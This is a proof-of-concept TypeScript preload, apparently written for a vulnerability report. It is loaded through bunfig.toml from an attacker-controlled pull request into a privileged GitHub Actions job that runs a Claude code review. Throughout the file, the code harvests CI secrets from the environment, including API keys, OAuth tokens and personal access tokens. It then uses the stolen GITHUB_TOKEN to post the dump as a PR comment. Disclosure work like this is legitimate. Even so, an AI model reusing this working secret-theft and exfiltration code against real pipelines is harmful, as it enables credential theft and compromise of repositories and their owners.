// PoC preload loaded by bun via ./bunfig.toml when the trusted workflow
// runs `bun run <script>` from the attacker-controlled PR checkout.
//
// Demonstrates in-process arbitrary code execution inside the privileged
// claude-review-comment job. The preload runs before every trusted
// `bun run` invocation in the job (multiple fires per job), each time
// with full `process.env` access to whatever secrets that step was given.
//
// To prove reachability of user-configured secrets (ANTHROPIC_API_KEY,
// CLAUDE_CODE_OAUTH_TOKEN, WORKFLOW_PAT), this preload tracks which
// secret NAMES it has already seen across prior fires in the same job,
// and posts an additional PR comment whenever a fresh fire sees a new
// secret name. This proves the in-process attacker code can read those
// secrets from process.env without spamming the PR with duplicates.
//
// Live auto-provisioned tokens (GITHUB_TOKEN, ACTIONS_ID_TOKEN_REQUEST_TOKEN,
// ACTIONS_RUNTIME_TOKEN) are masked in the public comment even though the
// preload trivially has their raw values. All other captured secrets are
// dumped in full because they are dummy values on this PoC victim repo.

import {
  appendFileSync,
  existsSync,
  readFileSync,
  writeFileSync,
} from "node:fs";

const token = process.env.GITHUB_TOKEN ?? "";
const repo = process.env.GITHUB_REPOSITORY ?? "";
const actor = process.env.GITHUB_ACTOR ?? "";
const runId = process.env.GITHUB_RUN_ID ?? "";
const workflow = process.env.GITHUB_WORKFLOW ?? "";
const jobName = process.env.GITHUB_JOB ?? "";
const prNumber = process.env.PR_NUMBER ?? "";
const summaryPath = process.env.GITHUB_STEP_SUMMARY;

// Live auto-provisioned job tokens — mask in the public comment.
// These are real and live during job execution; we do not dump their raw
// values even though the preload reads them in-process.
const ALWAYS_MASK = new Set([
  "GITHUB_TOKEN",
  "ACTIONS_ID_TOKEN_REQUEST_TOKEN",
  "ACTIONS_RUNTIME_TOKEN",
]);

const mask = (t: string) =>
  t.length < 12 ? "(empty)" : `${t.slice(0, 6)}…${t.slice(-4)} (len=${t.length})`;

// Env keys worth dumping.
const isInteresting = (k: string) =>
  /^(GITHUB_|RUNNER_|ACTIONS_|CI$|CLAUDE|ANTHROPIC|NPM|NODE_AUTH|WORKFLOW_PAT)/
    .test(k);

// User-configurable secret names — used for the "new secret observed"
// dedup so each new secret that becomes reachable gets its own comment.
const isUserSecret = (k: string) =>
  /^(CLAUDE|ANTHROPIC|NPM|NODE_AUTH|WORKFLOW_PAT)/.test(k);

const interestingKeys = Object.keys(process.env).filter(isInteresting).sort();
const userSecretsThisFire = interestingKeys.filter(isUserSecret).sort();

// Track fire count + previously-seen user secret names across fires.
const fireCounterFile = "/tmp/.poc-fire-counter";
const seenSecretsFile = "/tmp/.poc-seen-secrets";

let fireNumber = 1;
try {
  if (existsSync(fireCounterFile)) {
    fireNumber = parseInt(readFileSync(fireCounterFile, "utf8").trim(), 10) + 1;
  }
  writeFileSync(fireCounterFile, String(fireNumber));
} catch {}

let seenBefore: string[] = [];
try {
  if (existsSync(seenSecretsFile)) {
    seenBefore = readFileSync(seenSecretsFile, "utf8")
      .split("\n")
      .map((s) => s.trim())
      .filter(Boolean);
  }
} catch {}

const newSecretsThisFire = userSecretsThisFire.filter(
  (k) => !seenBefore.includes(k),
);

// Build the env dump table. User secrets are dumped in full (dummies);
// live auto-provisioned tokens are masked.
const envLines = interestingKeys
  .map((k) => {
    const v = process.env[k] ?? "";
    if (ALWAYS_MASK.has(k)) {
      return `- \`${k}\` = ${mask(v)} *(live job token, masked)*`;
    }
    const isSecret = isUserSecret(k);
    if (isSecret) {
      return `- \`${k}\` = \`${v}\` **← secret, dumped in full (dummy value on PoC victim)**`;
    }
    return `- \`${k}\` = \`${v}\``;
  })
  .join("\n");

async function tokenProof(): Promise<string> {
  if (!token) return "_(no token in env)_";
  try {
    const res = await fetch(`https://api.github.com/repos/${repo}`, {
      headers: {
        authorization: `token ${token}`,
        accept: "application/vnd.github+json",
        "user-agent": "poc-preload",
      },
    });
    return `HTTP ${res.status} on \`GET /repos/${repo}\` using the stolen \`GITHUB_TOKEN\``;
  } catch (e) {
    return `_fetch error: ${(e as Error).message}_`;
  }
}

// Post on fire #1 (initial proof) OR on any subsequent fire where a new
// user secret name has become reachable.
const shouldPost = fireNumber === 1 || newSecretsThisFire.length > 0;

if (shouldPost) {
  const proofLine =
    fireNumber === 1
      ? await tokenProof()
      : "_(token liveness already proven on fire #1)_";

  const header =
    fireNumber === 1
      ? "## PoC: in-process code execution via `bunfig.toml` preload — fire #1 (initial)"
      : `## PoC: fire #${fireNumber} — new secret(s) observed: ${newSecretsThisFire
          .map((k) => `\`${k}\``)
          .join(", ")}`;

  const md = `${header}

**Workflow:** \`${workflow}\` / job \`${jobName}\` / run \`${runId}\`
**Repo:** \`${repo}\`  **Actor (attacker PR author):** \`${actor}\`  **PR:** #${prNumber}

### Token liveness
${proofLine}

### Env visible to the in-process attacker preload on this fire
${envLines || "_(none)_"}

---
_Source: \`./.ci/setup.ts\`, loaded via \`./bunfig.toml\` from the
attacker-controlled PR head. Runs in-process before every trusted
\`bun run\` invocation in the job because \`bun run\` is called with
cwd = attacker checkout, so bun auto-loads \`bunfig.toml\` from the
attacker repo root._
`;

  // 1) Mirror to step summary.
  if (summaryPath) {
    try {
      appendFileSync(summaryPath, md);
    } catch {}
  }

  // 2) Local artifact for the runner filesystem.
  try {
    writeFileSync(`/tmp/poc-proof-fire-${fireNumber}.md`, md);
  } catch {}

  // 3) Post a PR comment using the stolen GITHUB_TOKEN.
  if (token && repo && prNumber) {
    try {
      const body = {
        body:
          `<!-- poc-rce-preload fire-${fireNumber} -->\n` +
          "> **PoC:** this comment was posted by the `bunfig.toml` preload " +
          "running inside the privileged Claude review job, using the " +
          "job's `GITHUB_TOKEN`. An external PR author with no write " +
          "permission should not be able to post as `github-actions[bot]`.\n\n" +
          md,
      };
      const res = await fetch(
        `https://api.github.com/repos/${repo}/issues/${prNumber}/comments`,
        {
          method: "POST",
          headers: {
            authorization: `token ${token}`,
            accept: "application/vnd.github+json",
            "content-type": "application/json",
            "user-agent": "poc-preload",
          },
          body: JSON.stringify(body),
        },
      );
      console.log(
        `::notice title=PoC comment fire #${fireNumber}::HTTP ${res.status}`,
      );
    } catch (e) {
      console.log(
        `::warning title=PoC comment error::${(e as Error).message}`,
      );
    }
  }
}

// Update the seen-secrets marker for the next fire.
try {
  const allSeen = Array.from(
    new Set([...seenBefore, ...userSecretsThisFire]),
  ).sort();
  writeFileSync(seenSecretsFile, allSeen.join("\n"));
} catch {}

console.log(
  `::notice title=PoC preload fired::fire #${fireNumber}, ${newSecretsThisFire.length} new user secret(s) observed`,
);
